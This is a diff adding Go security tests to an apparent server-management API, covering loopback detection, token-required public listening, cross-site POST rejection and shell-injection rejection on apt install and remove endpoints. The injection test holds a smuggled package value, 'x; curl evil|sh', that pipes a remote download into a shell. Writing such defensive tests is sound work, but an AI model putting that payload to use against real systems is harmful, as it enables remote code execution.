@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"net/http"
 	"net/http/httptest"
+	"strings"
 	"testing"
 	"time"
 
@@ -799,5 +800,57 @@ func TestWebhookEventFiltering(t *testing.T) {
 				t.Errorf("Expected shouldSend=%v for event '%s' with enabled=%v", tt.shouldSend, tt.event, tt.enabledEvents)
 			}
 		})
+	}
+}
+
+func TestIsLoopbackAddr(t *testing.T) {
+	cases := map[string]bool{
+		"127.0.0.1:8080": true,
+		"localhost:8080": true,
+		"[::1]:8080":     true,
+		":8080":          false,
+		"0.0.0.0:8080":   false,
+		"[::]:8080":      false,
+		"10.0.0.5:8080":  false,
+		"garbage":        false,
+	}
+	for addr, want := range cases {
+		if got := isLoopbackAddr(addr); got != want {
+			t.Errorf("isLoopbackAddr(%q) = %v, want %v", addr, got, want)
+		}
+	}
+}
+
+func TestNewRefusesPublicListenWithoutToken(t *testing.T) {
+	_, err := New(Config{ListenAddr: ":8080"})
+	if err == nil || !strings.Contains(err.Error(), "without an API token") {
+		t.Fatalf("expected refusal, got %v", err)
+	}
+}
+
+func TestCrossOriginPostRejected(t *testing.T) {
+	ts := newTestServer(t)
+
+	req := httptest.NewRequest("POST", "/api/apply", nil)
+	req.Header.Set("Sec-Fetch-Site", "cross-site")
+	rec := httptest.NewRecorder()
+	ts.handler().ServeHTTP(rec, req)
+
+	if rec.Code != http.StatusForbidden {
+		t.Errorf("Expected status 403 for cross-site POST, got %d", rec.Code)
+	}
+}
+
+func TestAptInstallRejectsShellInjection(t *testing.T) {
+	ts := newTestServer(t)
+
+	for _, path := range []string{"/api/hosts/web1/apt/install", "/api/hosts/web1/apt/remove"} {
+		req := httptest.NewRequest("POST", path, strings.NewReader(`{"package":"x; curl evil|sh"}`))
+		rec := httptest.NewRecorder()
+		ts.mux.ServeHTTP(rec, req)
+
+		if rec.Code != http.StatusBadRequest {
+			t.Errorf("%s: expected status 400, got %d", path, rec.Code)
+		}
 	}
 }
